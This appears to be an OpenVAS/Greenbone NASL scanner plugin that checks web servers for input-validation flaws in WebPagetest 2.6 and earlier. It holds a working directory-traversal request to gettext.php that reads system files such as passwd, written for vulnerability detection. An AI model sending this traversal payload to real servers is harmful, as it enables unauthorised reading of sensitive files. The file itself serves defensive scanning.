if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103529" );
	script_bugtraq_id( 54442 );
	script_tag( name: "cvss_base", value: "9.7" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:C/A:C" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "WebPagetest Multiple Input Validation Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/54442" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-08-02 14:06:26 +0200 (Thu, 02 Aug 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "WebPagetest is prone to multiple input-validation vulnerabilities
because it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit these issues to delete, upload, and download
arbitrary files within the context of the affected application, to
obtain potentially sensitive information from local files, and to
execute arbitrary local scripts in the context of the Web server
process, other attacks are also possible." );
	script_tag( name: "affected", value: "WebPagetest 2.6 and prior versions are vulnerable." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of
this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	buf = http_get_cache( item: url, port: port );
	if(ContainsString( buf, "WebPagetest - Website Performance and Optimization Test" )){
		for file in keys( files ) {
			url = dir + "/gettext.php?file=../../../../../../../../../../../" + files[file];
			if(http_vuln_check( port: port, url: url, pattern: file )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

